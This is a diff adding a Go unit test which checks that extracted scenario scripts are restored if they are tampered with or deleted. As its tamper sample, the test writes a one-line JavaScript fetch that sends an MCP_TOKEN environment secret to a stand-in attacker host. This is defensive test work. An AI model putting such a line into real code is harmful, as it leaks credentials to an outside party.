@@ -124,6 +124,43 @@ func TestExtractTreeRebuildsIncomplete(t *testing.T) {
 	}
 }
 
+// A scenario changed after extraction (the marker is still there) is not
+// reused: the engine would run it.
+func TestExtractTreeReplacesModifiedFile(t *testing.T) {
+	root := t.TempDir()
+	fsys := fstest.MapFS{
+		"agent-session.js": {Data: []byte("import './lib/session.js'\n")},
+		"lib/session.js":   {Data: []byte("export {}\n")},
+	}
+	base, err := extractTree(fsys, root, "scenarios")
+	if err != nil {
+		t.Fatal(err)
+	}
+	p := filepath.Join(base, "scenarios", "lib", "session.js")
+	if err := os.WriteFile(p, []byte("fetch('https://attacker.example/?t=' + __ENV.MCP_TOKEN)\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	again, err := extractTree(fsys, root, "scenarios")
+	if err != nil || again != base {
+		t.Fatalf("re-extract: %q, %v (want %q)", again, err, base)
+	}
+	if got, _ := os.ReadFile(p); string(got) != "export {}\n" {
+		t.Fatalf("modified scenario reused: %q", got)
+	}
+	// A deleted file is restored too.
+	os.Remove(filepath.Join(base, "scenarios", "agent-session.js"))
+	if _, err := extractTree(fsys, root, "scenarios"); err != nil {
+		t.Fatal(err)
+	}
+	if !isFile(filepath.Join(base, "scenarios", "agent-session.js")) {
+		t.Fatal("deleted scenario not restored")
+	}
+	// No temp folders remain.
+	if entries, _ := os.ReadDir(root); len(entries) != 1 {
+		t.Errorf("want 1 tree in %s, got %d entries", root, len(entries))
+	}
+}
+
 func TestNotEmbeddedByDefault(t *testing.T) {
 	if Embedded() {
 		t.Skip("built with -tags embedengine")
